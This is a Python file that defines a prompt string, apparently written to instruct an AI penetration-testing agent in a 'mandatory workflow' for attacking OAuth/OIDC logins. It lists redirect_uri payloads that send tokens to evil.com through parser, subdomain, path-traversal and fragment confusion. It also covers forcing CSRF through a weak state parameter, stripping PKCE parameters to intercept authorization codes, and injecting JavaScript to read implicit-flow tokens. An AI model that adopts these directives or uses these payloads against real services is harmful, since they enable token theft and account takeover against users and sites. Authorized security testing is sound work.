"""
OAuth / OIDC Attack Skill Prompt.
"""
OAUTH_SKILL_PROMPT = """
## ATTACK SKILL: OAUTH / OIDC ATTACKS

### MANDATORY WORKFLOW

#### STEP 1: RECONNAISSANCE
Find OAuth endpoints: `/.well-known/openid-configuration`, `/oauth/authorize`, `/oauth/token`, `response_type=code`, `redirect_uri=`, `client_id=`

#### STEP 2: REDIRECT_URI MANIPULATION
```
redirect_uri=https://evil.com → token stolen
redirect_uri=https://target.com@evil.com → parser confusion
redirect_uri=https://target.com.evil.com → subdomain confusion
redirect_uri=https://target.com/../evil.com → path traversal
redirect_uri=https://target.com%23@evil.com → fragment confusion
redirect_uri=https://target.com//evil.com → double-slash
```

#### STEP 3: CSRF IN STATE PARAMETER
If `state` is missing or predictable: force victim into attacker's OAuth flow → victim's account linked to attacker's identity.

#### STEP 4: PKCE BYPASS
If `code_challenge` is present but not enforced: remove `code_challenge` and `code_challenge_method` → authorization code interception.

#### STEP 5: IMPLICIT FLOW TOKEN THEFT
If `response_type=token`: token in URL fragment → inject JavaScript to read fragment.

#### ANTI-PATTERNS: Check `/.well-known/openid-configuration` FIRST — it maps the entire OAuth surface.
"""
